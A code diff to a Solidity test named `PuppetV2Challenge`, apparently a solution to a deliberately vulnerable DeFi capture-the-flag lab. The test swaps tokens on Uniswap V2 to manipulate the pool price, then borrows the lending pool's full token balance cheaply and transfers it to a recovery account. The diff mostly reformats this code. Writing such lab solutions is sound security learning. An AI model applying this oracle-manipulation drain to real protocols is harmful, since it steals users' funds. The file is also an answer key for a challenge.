@@ -99,26 +99,20 @@ contract PuppetV2Challenge is Test {
      */
     function test_puppetV2() public checkSolvedByPlayer {
         // create path for UniswapV2
-        address[] memory path = new address[](2);
-        path[0] = address(token);
-        path[1] = address(weth);
+       address[] memory path = new address[](2);
+       path[0] = address(token);
+       path[1] = address(weth);
         // swap tokens in to the pool for price manipulation
-        token.approve(address(uniswapV2Router), POOL_INITIAL_TOKEN_BALANCE);
-        uniswapV2Router.swapExactTokensForETH(
-            token.balanceOf(address(player)),
-            0,
-            path,
-            address(player),
-            block.timestamp
-        );
+        token.approve(address(uniswapV2Router), type(uint256).max);
+        uniswapV2Router.swapExactTokensForETH(token.balanceOf(player), 0, path, address(player), block.timestamp);
         // when the price is manipulated, we can attack the pool
         // convert eth to weth
-        weth.deposit{value: player.balance}();
-        // approve lendingPool to use weth of player as collateral
-        weth.approve(address(lendingPool), type(uint256).max);
-        // borrow weth
-        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
-        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
+       weth.deposit{value: player.balance}();
+        // approve lendingPool spending all weth of player for collateral
+       weth.approve(address(lendingPool), type(uint256).max);
+        // borrow weth then transfer into recovery account
+       lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+       token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
